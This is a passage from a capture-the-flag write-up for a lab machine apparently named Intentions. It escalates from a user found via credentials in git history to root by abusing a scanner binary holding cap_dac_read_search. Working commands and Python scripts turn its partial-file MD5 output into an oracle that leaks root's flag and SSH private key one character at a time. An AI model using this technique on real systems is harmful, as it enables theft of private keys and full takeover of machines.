Afterwards, we can view the `git log -p -2` output to find some credentials.

<figure><img src="../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

We can then `su` to `greg`.

<figure><img src="../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

### Scanner Group --> Root Flag

We are part of the `scanner` group, and I used `find` to see what files we own:

```
greg@intentions:~$ find / -group scanner 2> /dev/null
/opt/scanner
/opt/scanner/scanner
```

There's a binary called `scanner` available on this machine:

```
greg@intentions:/opt/scanner$ file scanner 
scanner: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=a7sTitVjvr1qc4Ngg3jt/LY6QPsAiDYUOHaK7gUXN/5aWVPmSwER6KHrDxGzr4/SUP48whD2UTLJ-Q2kLmf, stripped
greg@intentions:/opt/scanner$ ls -la
total 1412
drwxr-x--- 2 root scanner    4096 Jun 19 11:26 .
drwxr-xr-x 3 root root       4096 Jun 10 15:14 ..
-rwxr-x--- 1 root scanner 1437696 Jun 19 11:18 scanner
```

This file is too big for reverse engineering, so let's do some dynamic analysis (AKA running it and seeing what it does).&#x20;

```
greg@intentions:/opt/scanner$ ./scanner 
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
        Please avoid using extra colons in the label as that is not currently supported.

        Expected output:
        1. Empty if no matches found
        2. A line for every match, example:
                [+] {LABEL} matches {FILE}

  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h
```

Interesting. This file isn't an SUID binary, so let's check its capabilities:

```
greg@intentions:/opt/scanner$ getcap scanner
scanner cap_dac_read_search=ep
```

This basically means that the `scanner` binary can read **any file in the system**. Since this file can read any file and tell us the hash of this file, we can use it to check whether files exist too.&#x20;

```
greg@intentions:/opt/scanner$ ./scanner -p -s 2 -c /root/.ssh/id_rsa
[DEBUG] /root/.ssh/id_rsa has hash 1cd5f0fae381ed1b066b927995b7ef60
greg@intentions:/opt/scanner$ ./scanner -p -s 2 -c /root/root.txt   
[DEBUG] /root/root.txt has hash adcea6f929ae419d4134072be81fb3ab
```

The binary also allows us to specify the length of the bytes to check, meaning that we can guess each character one by one. For example, when we use `-l 1`:

```
greg@intentions:/opt/scanner$ ./scanner -p -s 2 -c /root/root.txt -l 1
[DEBUG] /root/root.txt has hash eccbc87e4b5ce2fe28308fd9f2a7baf3
```

The resultant hash is crackable on CrackStation to give the first character of the flag:

<figure><img src="../../.gitbook/assets/image (3558).png" alt=""><figcaption></figcaption></figure>

We can slowly brute force the `root` flag out character by character. The user flag was 33 characters, so this should be the same. I took the script from my RainyDay writeup and modified it a bit:

```python
import hashlib
import string

def md5hash(s):
    return hashlib.md5(s.encode()).hexdigest()

given_hash = "eccbc87e4b5ce2fe28308fd9f2a7baf3"
flag = ""
charset = string.printable

for c in charset:
    test_flag = flag + c
    test_hash = md5hash(test_flag)
    if test_hash == given_hash:
        print("Flag is:", test_flag)
        break
```

Using that, it is possible to brute force the hash slowly by replacing the hash each time.&#x20;

```
greg@intentions:/opt/scanner$ ./scanner -p -s 2 -c /root/root.txt -l 1
[DEBUG] /root/root.txt has hash eccbc87e4b5ce2fe28308fd9f2a7baf3

$ python3 brute.py
Flag is: 3
```

I think we can do better. First, we can generate all the possible hashes of the root flag:

{% code overflow="wrap" %}
```bash
greg@intentions:/opt/scanner$ for i in {1..33}; do ./scanner -p -s 2 -c /root/root.txt -l $i >> /tmp/output.txt; done
```
{% endcode %}

We can then modify our script a bit to include the full list of hashes and brute force that instead:

```python
import hashlib
import string

hashes = [
'eccbc87e4b5ce2fe28308fd9f2a7baf3',
'6364d3f0f495b6ab9dcf8d3b5c6e0b01',
'6bcec1e5ab3029f75796afe4569866b9',
'a2aedc101184177cc09f4daab2a36743',
'2182d48584191fe8426e380f71c81a5b',
'4e50b644aa7c3c8b6c616c1a4f1e1600',
'7033d2b5eef140c0d0e8b6f04f20f69b',
'43d9414e8985a01a13e28daf58cddf22',
'dd69bde5698cd06b40da8ac5d4efc680',
'acc4531bc412f06d837d4b386fc716ec',
'627f232eb4ca4cc34149b465957842b9',
'f4c3d71caa281c2e2d78d49395b7e307',
'eaa344e850ffe22cb61de7d41256e641',
'f7bcd72029ef9bb45cb81664d3dfe79c',
'1b6ea862dadf5f328ab34f80bdd997c8',
'8596faec9865cc958ca3dfa5d82fce7c',
'c16e4346179f8c51df5c0ab696ba986b',
'6c92a73288228d922110868850471b71',
'ec8a2d5c2128cd350b71dce6ec3cb0c2',
'553e52dbe5da26d9ba8c78daa52493ac',
'ef4fac2ee1c7efbd6de737cdcbc8eb87',
'e06e80a0380c15baf048c3fab7843063',
'5b949c0414383b74637c485f1bcb8a72',
'5a2c11dd00bd91e02077b37fbdff54ea',
'b582b0ddbdccce25c35e16715d76c431',
'39bfc4c47f845e9125da3215b021a086',
'34e3e199ea8f1e28353154c001f5dfbd',
'4dc4536ab9c6b4b07d3a1e17111d2580',
'cac2e5b4e1f6a5f777e84e5839308b7f',
'5f79b12682936f5e129cc17588b510d5',
'8f990a781f7556b0582893249a454d5c',
'edd9709d0bd41c3f9792745d664f49e0',
'70a9b0ee85b67afca405156dcde9bdd8'
]

def md5hash(s):
    return hashlib.md5(s.encode()).hexdigest()

flag = ""
allchars = string.printable
for h in hashes:
    for c in allchars:
        test_flag = flag + c
        test_hash = md5hash(test_flag)
        if test_hash == h:
            print("Flag is:", test_flag)
            flag += c
            break
```

<figure><img src="../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

This would eventually get the correct hash out for us to submit.

### Key Brute Force --> Root Shell

I felt a bit weird just capturing the root flag, so let's modify our script a bit more to get the private SSH key of the `root` user.&#x20;

{% code overflow="wrap" %}
```bash
greg@intentions:/opt/scanner$ for i in {1..3000}; do ./scanner -p -s 2 -c /root/.ssh/id_rsa -l $i >> /tmp/sshkey.txt; done 
## random guess of 3000 characters
```
{% endcode %}

The 3000 limit would trigger a lot of errors since it attempts to read more characters than actually present, so we can just Ctrl + C it when that happens. It still generates the file containing all debug hashes properly.&#x20;

We can then transfer this to our machine via hosting the `output.txt` file on a Python HTTP server on the machine, and doing some `awk` magic on it to get it into Python list format:

```bash
$ cat sshkey.txt | awk '{print "\"" $5 "\"\,"}' > hashes.py
```

<figure><img src="../../.gitbook/assets/image (2732).png" alt=""><figcaption></figcaption></figure>

Just put this within a list like `hashes = [ <all the hashes> ]`. Afterwards, `sshkey.py` can be used to brute force the SSH key:

```python
import hashlib
import string
from hashes import hashes

def md5hash(s):
    return hashlib.md5(s.encode()).hexdigest()

flag = ""
allchars = string.printable
for h in hashes:
    for c in allchars:
        test_flag = flag + c
        test_hash = md5hash(test_flag)
        if test_hash == h:
            print("Key is:", test_flag)
            flag += c
            break
```

<figure><img src="../../.gitbook/assets/image (3190).png" alt=""><figcaption></figcaption></figure>

Then, just use this to `ssh` in as `root`:

<figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
